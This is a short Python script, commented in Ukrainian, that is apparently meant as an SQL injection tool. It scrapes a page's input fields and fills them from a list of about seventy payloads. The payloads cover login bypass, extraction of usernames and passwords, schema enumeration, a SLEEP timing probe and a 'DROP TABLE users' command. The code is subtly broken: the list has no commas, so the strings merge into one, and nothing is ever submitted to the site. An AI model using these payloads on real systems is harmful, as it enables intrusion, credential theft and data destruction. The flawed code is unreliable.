import requests
from bs4 import BeautifulSoup
import json

def sql():
    url = input("Enter the URL: ")
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    inputs = soup.find_all('input')

    # Отримання певних значень зі списку для введення в інпути
    values =  [
"' OR 1=1 --"
"' OR 'a'='a' --"
"' OR 1=1 LIMIT 1 --"
"' UNION SELECT * FROM users --"
"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --"
"' AND EXISTS(SELECT * FROM users WHERE username='admin') --"
"' UNION SELECT username, password FROM users WHERE username='admin' --"
"' AND (SELECT COUNT(*) FROM users) = 1 --"
"' UNION SELECT DISTINCT table_name FROM information_schema.tables --"
"' OR 'admin'='admin' --"
"' AND 1=0 UNION SELECT * FROM users --"
"' UNION SELECT NULL, NULL, NULL, NULL, table_name FROM information_schema.tables WHERE table_schema = 'public' --"
"' UNION SELECT NULL, NULL, NULL, NULL, column_name FROM information_schema.columns WHERE table_name = 'users' --"
"' OR 'a'='a' UNION SELECT username, password FROM users --"
"' AND (SELECT COUNT(*) FROM users WHERE username='admin') = 1 --"
"' UNION SELECT (SELECT COUNT(*) FROM users WHERE username='admin') --"
"' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --"
"' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password='password') > 0 --"
"' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password='admin') > 0 --"
"' UNION SELECT * FROM users WHERE username LIKE '%' --"
"' UNION SELECT * FROM users WHERE LOWER(username)=LOWER('admin') --"
"' UNION SELECT * FROM users WHERE username='admin' --"
"' OR 'admin'='admin' LIMIT 1 --"
"' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password IS NULL) > 0 --"
"' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND LENGTH(password) < 10) > 0 --"
"' UNION SELECT GROUP_CONCAT(username) FROM users --"
"' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'public' --"
"' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'users' --"
"' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) AS dummy_table) > 2 --"
"' AND (SELECT COUNT(*) FROM (SELECT * FROM users) AS subquery) > 0 --"
"' UNION SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users) > 1 --"
"' UNION SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users) > 1 ORDER BY username DESC --"
"' UNION SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users) > 1 LIMIT 1 OFFSET 1 --"
"' UNION SELECT * FROM users WHERE username='admin' AND (SELECT COUNT() FROM users) > 1 UNION SELECT * FROM users WHERE username='admin' AND (SELECT COUNT() FROM users) > 1 --"
"' AND (SELECT COUNT() FROM users WHERE username='admin') > 0 AND (SELECT COUNT() FROM users WHERE username='admin' AND password='password') > 0 --"
"' AND (SELECT COUNT() FROM users WHERE username='admin' AND password='password') > 0 AND (SELECT COUNT() FROM users WHERE username='admin' AND password='admin') > 0 --"
"' UNION SELECT * FROM users WHERE username='admin' AND 1633781711=COALESCE((SELECT COUNT(*) FROM information_schema.tables WHERE table_name='useragent'),0) --"
"' UNION SELECT * FROM comments WHERE comment LIKE '%<%' --"
"' AND SLEEP(5) --"
"'; DROP TABLE users; --"
"' UNION SELECT * FROM users WHERE username LIKE '%admin%' --"
"' UNION SELECT * FROM users WHERE username='admin'--"
"' UNION SELECT * FROM users WHERE username='admin'-- -"
"' UNION SELECT * FROM users WHERE username='admin' -- -"
"' UNION SELECT * FROM users WHERE username='admin' -- - #"
"' UNION SELECT * FROM users WHERE username='admin' -- -/*"
"' UNION SELECT * FROM users WHERE username='admin' -- -/* ORDER BY 'a'--"
"' UNION SELECT * FROM users WHERE username='admin' --"
"' UNION SELECT * FROM users WHERE username='admin' OR '1'='1' --"
"' UNION SELECT * FROM users WHERE username='admin' AND '1'='1' --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT * FROM other_table --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT username, password FROM other_table --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT NULL, NULL, NULL, NULL, table_name FROM information_schema.tables WHERE table_schema = 'public' --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT NULL, NULL, NULL, NULL, column_name FROM information_schema.columns WHERE table_name = 'users' --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT GROUP_CONCAT(username) FROM users WHERE username != 'admin' --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'public' --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'users' --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT * FROM users WHERE username='admin' --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT * FROM users WHERE username='admin' AND password='password' --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT * FROM users WHERE username='admin' OR password='password' --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT * FROM users WHERE username='admin' AND password IS NULL --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT * FROM users WHERE username='admin' AND LENGTH(password) < 10 --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT * FROM users WHERE username='admin' AND password LIKE '%password%' --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT * FROM users WHERE username='admin' AND password REGEXP '^pass.*$' --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT * FROM users WHERE username='admin' AND password BETWEEN 'a' AND 'm' --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users) > 1 --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users) > 1 ORDER BY username DESC --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users) > 1 LIMIT 1 OFFSET 1 --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT * FROM users WHERE username='admin' AND (SELECT COUNT() FROM users) > 1 UNION SELECT * FROM users WHERE username='admin' AND (SELECT COUNT() FROM users) > 1 --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users) > 1 ORDER BY username DESC LIMIT 1 --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users) > 1 ORDER BY username DESC LIMIT 1 OFFSET 1 --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT * FROM users WHERE username='admin' AND (SELECT COUNT() FROM users) > 1 UNION SELECT * FROM users WHERE username='admin' AND (SELECT COUNT() FROM users) > 1 ORDER BY username DESC LIMIT 1 OFFSET 1 --"
"' UNION SELECT * FROM users WHERE username='admin' UNION SELECT * FROM users WHERE username='admin' AND (SELECT COUNT() FROM users) > 1 UNION SELECT * FROM users WHERE username='admin' AND (SELECT COUNT() FROM users) > 1 ORDER BY username DESC LIMIT 1 --"
]

    # Введення значень в інпути
    for i, input_tag in enumerate(inputs):
        if i < len(values):
            input_tag['value'] = values[i]

    # Збереження у JSON форматі як відгук

    data = {
        "website": url,
        "inputs": {input_tag['name']: input_tag['value'] for input_tag in inputs}
    }

    with open('response.json', 'w') as f:
        json.dump(data, f)